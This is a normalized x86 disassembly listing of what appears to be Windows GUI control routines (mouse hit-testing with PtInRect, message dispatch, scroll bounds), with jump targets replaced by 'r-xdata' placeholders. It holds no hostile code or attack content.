jmp r-xdata
sub_452410
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xc2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_452448
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_451a18
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd4
call sub_40484c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd4
call sub_40484c
sub_4524cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_450400
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_450ad0
movzx eax [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_452448
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_452518
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_450400
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_452534
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_450400
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_450ad0
movzx eax [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_452448
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_40484c
sub_452590
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_4519b8
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_45194c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4519b8
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_45262c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_452448
pop esi
pop ebx
retn
sub_452655
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_452448
pop esi
pop ebx
retn
sub_45267d
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_452448
pop esi
pop ebx
retn
sub_4526ad
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_452448
pop esi
pop ebx
retn
sub_4526d5
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_452710
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_451a18
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd3
call sub_40484c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd3
call sub_40484c
sub_452788
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_4527c0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_43bbf8
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd2
call sub_40484c
sub_4527f8
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_450ad0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4527c0
add esp 0x1c
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push [ esp + 0x8 ]
push [ esp + 0x8 ]
lea edx [ esp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x14 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40484c
sub_45287c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4527c0
pop esi
pop ebx
retn
sub_45289c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4527c0
pop esi
pop ebx
retn
sub_4528bc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0x4 ]
call sub_43bbf8
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40484c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_45d684
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452914
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_450ac0
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_450ad0
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_451b4c
pop esi
retn
sub_452954
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_451b80
sub_452a02
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_450cec
mov cl 0x1
sub_452a5c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x70 ]
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x5a ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0xb00d
call sub_451b4c
sub_452a94
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x70 ]
call sub_452a5c
pop ecx
push ebp
mov eax [ edx + 0x8 ]
call sub_452a5c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x5a ] 0x1
sub_452ad0
push esi
push edi
mov esi eax
cmp [ esi + 0x60 ] 0x0
je r-xdata
pop edi
pop esi
retn
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
mov [ esi + 0x60 ] 0x1
movzx edx [ edi + 0x5f ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_452af4
push ebx
push esi
push edi
add esp 0xfffffff4
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x4 ]
push eax
movsx ecx [ ebx + 0x6 ]
movzx edx [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_40484c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_451b4c
mov [ ebx + 0xc ] eax
sub_452b84
push ebx
mov ebx eax
cmp [ ebx + 0x8e ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
mov edx [ ebx + 0x30 ]
test [ edx + 0x1c ] 0x10
setne dl
cmp al dl
jne r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x8d ]
mov eax ebx
call sub_4509e4
mov [ ebx + 0x8e ] 0x1
sub_452bc0
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_450988
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_450988
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_452c1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb013
call sub_451b4c
pop esi
pop ebx
retn
cmp [ ebx + 0x13a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_452c58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb014
call sub_451b4c
pop esi
pop ebx
retn
cmp [ ebx + 0x132 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_452c9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_404528
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_44ff58
mov edx [ esp ]
mov eax esi
call sub_44ff24
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_450228
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_45026c
sub_452d20
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_418420
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_450324
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x4c ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_418470
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4501d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452dac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_452c9c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax ebx
call sub_4585f8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_452d20
pop ecx
jmp r-xdata
sub_452e0c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_452efc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452f03
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4508c4
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_450894
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_450894
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_405974
jne r-xdata
lea eax [ esi + 0x84 ]
mov edx [ edi + 0x7c ]
call sub_405584
cmp [ esi + 0x84 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_4507b4
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x110 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x114 ] eax
cmp [ esi + 0x112 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_452f0c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40484c
sub_452f38
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452f58
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452f78
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452f98
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_452fb8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42042c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_44fda0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40484c
sub_452ff0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45308d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419f24
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44a8b4
mov edx [ ebx + 0x84 ]
mov eax edi
call sub_44a9f0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_450894
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44a74c
movzx edx [ ebx + 0x57 ]
mov eax edi
call sub_44ab10
push [ ebx + 0x114 ]
push [ ebx + 0x110 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453094
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_45309c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fwait
fnstsw ax
sahf
jae r-xdata
sub_4530d8
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_45309c
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_453188
push ebx
mov ebx eax
cmp [ ebx + 0x94 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0x94 ]
call sub_4047dc
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4531bc
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
sub_453208
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x84 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_453238
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x11 ] eax
movsx eax [ esp + 0x11 ]
mov [ esp + 0x15 ] eax
movsx eax [ esp + 0x13 ]
mov [ esp + 0x19 ] eax
mov eax [ esp + 0x15 ]
mov [ esp ] eax
mov eax [ esp + 0x19 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_418498
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4503d4
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x28 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x28 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_40484c
movzx eax [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_40484c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx edi
mov eax edi
call sub_450400
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_418498
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x30 ]
xor edx edx
xor eax eax
call sub_418420
lea edx [ esp + 0x30 ]
mov ecx esp
mov eax edi
call sub_450324
sub_45337c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
sub_4533bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4512b8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4533fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4533f4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
and [ esi + 0x50 ] 0xffefffff
or [ esi + 0x50 ] 0x100000
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
sub_45342c
test [ eax + 0x55 ] 0x40
jne r-xdata
retn
test [ eax + 0x1c ] 0x2
jne r-xdata
mov edx [ eax + 0x40 ]
mov [ eax + 0x180 ] edx
mov edx [ eax + 0x44 ]
mov [ eax + 0x184 ] edx
mov edx [ eax + 0x48 ]
mov [ eax + 0x188 ] edx
mov edx [ eax + 0x4c ]
mov [ eax + 0x18c ] edx
sub_453500
push ebx
push esi
mov esi edx
